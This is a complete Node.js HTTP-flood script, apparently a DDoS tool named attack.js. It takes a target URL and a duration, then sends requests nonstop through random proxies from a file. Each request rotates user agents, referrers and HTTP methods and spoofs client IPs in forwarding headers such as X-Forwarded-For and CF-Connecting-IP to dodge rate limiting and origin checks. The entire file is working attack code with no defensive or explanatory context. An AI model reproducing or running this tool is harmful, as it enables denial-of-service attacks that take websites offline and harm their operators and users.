const fs = require('fs');
const https = require('https');
const http = require('http');
const { URL } = require('url');

const target = process.argv[2];
const durationSec = parseInt(process.argv[3]);

if (!target || !durationSec) {
    console.log("Usage: node attack.js <url> <duration_in_seconds>");
    process.exit(1);
}

const proxies = fs.readFileSync('proxy.txt', 'utf-8').split('\n').filter(Boolean);
const userAgents = fs.readFileSync('ua.txt', 'utf-8').split('\n').filter(Boolean);
const referrers = fs.readFileSync('refs.txt', 'utf-8').split('\n').filter(Boolean);

function getRandom(arr) {
    return arr[Math.floor(Math.random() * arr.length)];
}

function randomIp() {
    return Array.from({ length: 4 }, () => Math.floor(Math.random() * 256)).join('.');
}

const methods = ['GET', 'POST', 'HEAD', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'];
const parsedUrl = new URL(target);
const isHttps = parsedUrl.protocol === 'https:';
let totalRequests = 0;

console.log(`ATTACK STARTED : TIME LEFT = ${durationSec}s`);

function sendRequest(proxy) {
    const ua = getRandom(userAgents);
    const ref = getRandom(referrers);
    const method = getRandom(methods);
    const [host, port] = proxy.split(':');
    const postData = 'data=fakepayload&rand=' + Math.random();
    const spoofedIp = randomIp();

    const options = {
        host,
        port,
        method: 'CONNECT',
        timeout: 5000
    };

    const req = http.request(options);
    req.on('connect', (res, socket) => {
        const client = isHttps ? https : http;

        const headers = {
            'User-Agent': ua,
            'Referer': ref,
            'Host': parsedUrl.hostname,
            'X-Forwarded-For': spoofedIp,
            'X-Real-IP': spoofedIp,
            'CF-Connecting-IP': spoofedIp,
            'Forwarded': `for=${spoofedIp};proto=http;by=${randomIp()}`,
            'Via': `1.1 ${randomIp()}`,
            'Client-IP': spoofedIp
        };

        if (['POST', 'PUT', 'PATCH'].includes(method)) {
            headers['Content-Type'] = 'application/x-www-form-urlencoded';
            headers['Content-Length'] = Buffer.byteLength(postData);
        }

        const requestOptions = {
            hostname: parsedUrl.hostname,
            port: parsedUrl.port || (isHttps ? 443 : 80),
            path: parsedUrl.pathname + parsedUrl.search,
            method,
            headers,
            socket: socket,
            agent: false,
            timeout: 5000
        };

        const proxyReq = client.request(requestOptions, (res) => {
            res.on('data', () => {});
            res.on('end', () => {});
        });

        proxyReq.on('error', () => {});
        if (['POST', 'PUT', 'PATCH'].includes(method)) {
            proxyReq.write(postData);
        }
        proxyReq.end();
        totalRequests++;
    });

    req.on('error', () => {});
    req.on('timeout', () => req.destroy());
    req.end();
}

const endTime = Date.now() + durationSec * 1000;

function run() {
    if (Date.now() >= endTime) {
        console.log(`ATTACK DONE : TOTAL REQUESTS = ${totalRequests}`);
        process.exit(0);
    }

    const proxy = getRandom(proxies);
    sendRequest(proxy);
    setImmediate(run);
}

run();
